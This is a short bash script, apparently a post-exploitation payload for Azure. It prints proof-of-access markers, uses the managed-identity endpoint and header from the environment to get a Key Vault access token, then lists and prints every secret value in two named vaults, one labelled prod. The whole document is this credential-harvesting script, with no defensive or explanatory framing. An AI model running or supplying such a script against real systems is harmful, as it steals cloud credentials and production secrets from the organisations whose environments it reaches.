printf 'APP_PROOF '; id | tr -d '\n'; printf ' host='; hostname; pwd
E="${IDENTITY_ENDPOINT:-${MSI_ENDPOINT:-}}"; H="${IDENTITY_HEADER:-${MSI_SECRET:-}}"
printf 'EP=%s HDRLEN=%s\n' "$E" "${#H}"
T=$(curl -s "$E?resource=https://vault.azure.net&api-version=2019-08-01" -H "X-IDENTITY-HEADER: $H")
printf 'MITOK=%s\n' "$T"
tok=$(printf '%s' "$T" | sed -n 's/.*"access_token":"\([^"]*\)".*/\1/p')
printf 'TOKLEN=%s\n' "${#tok}"
for V in kv-tbl-sec-x3euoz kv-tbl-prod-x3euoz; do
  L=$(curl -s -H "Authorization: Bearer $tok" "https://$V.vault.azure.net/secrets?api-version=7.4")
  printf 'KVLIST %s: %s\n' "$V" "$L"
  for id in $(printf '%s' "$L" | grep -oE '"id":"[^"]+"' | sed -e 's/.*"id":"//' -e 's/"//'); do
    printf 'SECRET %s/%s: %s\n' "$V" "$id" "$(curl -s -H "Authorization: Bearer $tok" "$id?api-version=7.4")"
  done
done
printf 'INNER_DONE\n'
